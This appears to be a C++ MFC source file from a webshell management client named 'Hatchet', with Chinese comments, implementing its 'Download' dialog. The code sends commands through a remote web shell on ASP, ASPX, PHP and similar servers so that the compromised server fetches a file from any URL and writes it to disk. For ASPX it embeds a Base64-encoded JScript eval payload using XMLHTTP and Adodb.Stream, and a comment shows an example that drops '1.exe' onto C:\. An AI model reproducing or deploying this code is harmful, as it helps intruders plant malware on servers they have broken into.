// WgetDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Hatchet.h"
#include "WgetDlg.h"


// CWgetDlg 对话框

IMPLEMENT_DYNAMIC(CWgetDlg, CDialog)

CWgetDlg::CWgetDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CWgetDlg::IDD, pParent)
{

}

CWgetDlg::~CWgetDlg()
{
}

void CWgetDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CWgetDlg, CDialog)
	ON_EN_SETFOCUS(IDC_EDIT_WGET_URL, &CWgetDlg::OnEnSetfocusEditWgetUrl)
	ON_BN_CLICKED(IDC_ONWGET, &CWgetDlg::OnBnClickedOnWget)
END_MESSAGE_MAP()


// CWgetDlg 消息处理程序

BOOL CWgetDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	GetDlgItem(IDC_EDIT_WGET_URL)->SetFont(&m_FontSample);
	GetDlgItem(IDC_EDIT_WGET_PATH)->SetFont(&m_FontSample);
	GetDlgItem(IDC_ONWGET)->SetFont(&m_FontSample);
	GetDlgItem(IDCANCEL)->SetFont(&m_FontSample);


	bData = false;//保存的路劲有输入，就不用随之改变了

	SetWindowText("Download");
	SetDlgItemText(IDC_EDIT_WGET_PATH, szWgetPath);
	SetDlgItemText(IDC_EDIT_WGET_URL, "http://");

	szSiteUrl = szGlobal_SiteUrl;
	szSitePass = szGlobal_SitePass;
	nSiteScript = nGlobal_SiteScript;
	nSiteCode = nGlobal_SiteCode;

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

BOOL CWgetDlg::PreTranslateMessage(MSG* pMsg)
{
	if(pMsg -> message == WM_KEYDOWN)
	{
		if ((pMsg->wParam == 'A' || pMsg->wParam == 'a') && ::GetKeyState(VK_CONTROL)&0x8000)
		{
			if ( GetDlgItem(IDC_EDIT_WGET_URL) == GetFocus() )						//全选
			{
				((CEdit *)GetDlgItem(IDC_EDIT_WGET_URL))->SetSel( 0, -1);			//全选
			}
			if ( GetDlgItem(IDC_EDIT_WGET_PATH) == GetFocus() )						//全选
			{
				((CEdit *)GetDlgItem(IDC_EDIT_WGET_PATH))->SetSel( 0, -1);			//全选
			}
		}
	}

	if (!bData && pMsg->message == WM_KEYUP)
	{
		if (GetFocus() == GetDlgItem(IDC_EDIT_WGET_PATH))
		{
			if(pMsg->wParam > 31)
			{
				bData = true;//保存的路劲有输入，就不用随之改变了
			}
		}else{
			if (GetFocus() == GetDlgItem(IDC_EDIT_WGET_URL))		//焦点在URL文本框上
			{
				CString szUrl;
				GetDlgItemText(IDC_EDIT_WGET_URL, szUrl);
				int posX = rfind(szUrl, "/");
				if (posX > 0 && szUrl.Find("/", 9) != -1)
				{
					SetDlgItemText(IDC_EDIT_WGET_PATH, szWgetPath + szUrl.Right(posX-1));				
				}
			}
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CWgetDlg::OnEnSetfocusEditWgetUrl()
{
	((CEdit *)GetDlgItem(IDC_EDIT_WGET_URL))->SetSel(-1, 0, false);//加载完成窗体,设置一下光标到最后
}


DWORD WINAPI My_Thread_Wget(LPVOID lpParam)
{
	CWgetDlg* pDlg = (CWgetDlg*)lpParam;

	CString temp,szCWgetDlgTemp;
	CString szCWgetDlgUrl;
	CString szCWgetDlgPath;

	pDlg->GetDlgItemText(IDC_EDIT_WGET_URL, szCWgetDlgUrl);
	pDlg->GetDlgItemText(IDC_EDIT_WGET_PATH, szCWgetDlgPath);
	szCWgetDlgPath.Replace("\\", "\\\\");

	if (pDlg->nSiteScript == 1)					//ASP
	{
		szCWgetDlgUrl = UrlEnCode(pDlg->nSiteCode, szCWgetDlgUrl, false, true);
		szCWgetDlgPath = UrlEnCode(pDlg->nSiteCode, szCWgetDlgPath, false, true);
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szWget[0] + szCWgetDlgUrl +"&z2="+ szCWgetDlgPath, pDlg->nSiteCode, temp, szError);

	}else if (pDlg->nSiteScript == 2)				//ASPX 有编码
	{
		szCWgetDlgUrl = MyBase64Encode(pDlg->nSiteCode, szCWgetDlgUrl);
		szCWgetDlgPath = MyBase64Encode(pDlg->nSiteCode, szCWgetDlgPath);

		szCWgetDlgUrl = szWget[1] + szCWgetDlgUrl +"&z2="+ szCWgetDlgPath;
		szCWgetDlgTemp.Format("%d", pDlg->nSiteCode);
		szCWgetDlgUrl.Replace("%nPageCode%", szCWgetDlgTemp);

		CString szBase64EvalCode = "var X=new ActiveXObject(\"Microsoft.XMLHTTP\");var S=new ActiveXObject(\"Adodb.Stream\");S.Type=1;S.Mode=3;S.Open();X.Open("
			"\"GET\",System.Text.Encoding.GetEncoding("+ szCWgetDlgTemp +").GetString(System.Convert.FromBase64String(Request.Item[\"z1\"])),false);X.Send();S.Write(X.Respons"
			"eBody);S.Position=0;S.SaveToFile(System.Text.Encoding.GetEncoding("+ szCWgetDlgTemp +").GetString(System.Convert.FromBase64String(Request.Item"
			"[\"z2\"])),2);S.close;S=null;X=null;Response.Write(\"1\");";
		szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
		szCWgetDlgUrl.Replace("%szBase64EvalCode%", szBase64EvalCode);

		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szCWgetDlgUrl, pDlg->nSiteCode, temp, szError);

	}else if(pDlg->nSiteScript == 3)
	{
		szCWgetDlgUrl = MyBase64Encode(pDlg->nSiteCode, szCWgetDlgUrl);
		szCWgetDlgPath = MyBase64Encode(pDlg->nSiteCode, szCWgetDlgPath);

		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szWget[2] + szCWgetDlgUrl +"&z2="+ szCWgetDlgPath, pDlg->nSiteCode, temp, szError);
	}else{
		//=L&z0=GB2312&z1=http%3A%2F%2F127.0.0.1%2F1.exe&z2=C%3A%5C%5C1.exe
		if (pDlg->nSiteCode == 65001)
		{
			szCWgetDlgTemp = "UTF-8";
		}
		else if (pDlg->nSiteCode == 936)
		{
			szCWgetDlgTemp = "GB2312";
		}
		else if (pDlg->nSiteCode == 950)
		{
			szCWgetDlgTemp = "BIG5";
		}

		szCWgetDlgUrl = UrlEnCode(pDlg->nSiteCode, szCWgetDlgUrl);
		szCWgetDlgPath = UrlEnCode(pDlg->nSiteCode, szCWgetDlgPath);

		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass +"=L&z0="+ szCWgetDlgTemp + szCWgetDlgUrl +"&z2="+ szCWgetDlgPath, pDlg->nSiteCode, temp, szError);
	}
	if (bHttpIsOK && temp == "1")	//成功
	{
		pDlg->PostMessage(WM_CLOSE);
		//CDialog::OnOK();
	}else{
		pDlg->SetWindowText("Download failed!");
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_ONWGET),TRUE);
	}

	return 0;
}

void CWgetDlg::OnBnClickedOnWget()
{
	CString szCWgetDlgUrl;
	GetDlgItemText(IDC_EDIT_WGET_URL, szCWgetDlgUrl);
	szCWgetDlgUrl.MakeLower();
	if (szCWgetDlgUrl.Left(4) != "http" || szCWgetDlgUrl.Find(".") == -1)
	{
		SetWindowText("URL input error!");
		return;
	}

	GetDlgItem(IDC_ONWGET)->EnableWindow(FALSE);
	CreateThread(NULL,0,My_Thread_Wget,(LPVOID)this,0,0);
}

void CWgetDlg::PostNcDestroy()
{
	delete this;
	CDialog::PostNcDestroy();
}

